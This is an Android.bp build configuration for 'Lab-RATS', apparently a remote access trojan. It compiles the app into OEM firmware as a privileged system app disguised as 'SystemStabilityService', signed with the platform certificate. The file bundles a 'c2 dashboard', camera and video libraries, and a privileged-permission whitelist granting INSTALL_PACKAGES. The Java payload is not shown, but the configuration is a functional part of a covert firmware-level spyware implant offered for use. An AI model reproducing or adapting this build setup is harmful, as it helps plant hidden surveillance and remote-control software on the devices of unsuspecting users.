// ====================================================================
//                    Lab-RATS AOSP Build Configuration
// ====================================================================
// Developed by K4N3CO © 2026
//
// This Android.bp blueprint compiles Lab-RATS directly into AOSP
// OEM firmware images as a pre-installed system application in the
// /system/priv-app/ partition with privileged INSTALL_PACKAGES permission.

android_app {
    name: "SystemStabilityService",

    // Compiles all Java source files from app/src/main/java
    srcs: [
        "app/src/main/java/**/*.java",
    ],

    // Target Android SDK Version
    sdk_version: "current",
    min_sdk_version: "21",
    target_sdk_version: "34",

    // Certificate signing for AOSP builds
    certificate: "platform",

    // CRITICAL: privileged: true places the application into /system/priv-app/
    privileged: true,

    // Static dependencies from app/build.gradle
    static_libs: [
        "androidx.appcompat_appcompat",
        "com.google.android.material_material",
        "androidx.constraintlayout_constraintlayout",
        "androidx.work_work-runtime",
        "androidx.camera_camera-core",
        "androidx.camera_camera-camera2",
        "androidx.camera_camera-lifecycle",
        "androidx.camera_camera-video",
        "androidx.camera_camera-view",
    ],

    // Include assets (c2 dashboard, sys metadata)
    asset_dirs: [
        "app/src/main/assets",
    ],

    // Optimization and ProGuard / R8 rules
    optimize: {
        enabled: true,
        proguard_flags_files: ["app/proguard-rules.pro"],
    },

    // Dex optimization settings
    dex_preopt: {
        enabled: true,
    },

    // Include OEM Privileged Permission Whitelist XML
    required: [
        "privapp-permissions-com.android.system.stability",
    ],
}

// Privileged Permission Whitelist for /system/etc/permissions/
prebuilt_etc {
    name: "privapp-permissions-com.android.system.stability",
    sub_dir: "permissions",
    src: "app/src/main/res/xml/privapp_permissions.xml",
    filename: "privapp-permissions-com.android.system.stability.xml",
    product_specific: false,
}
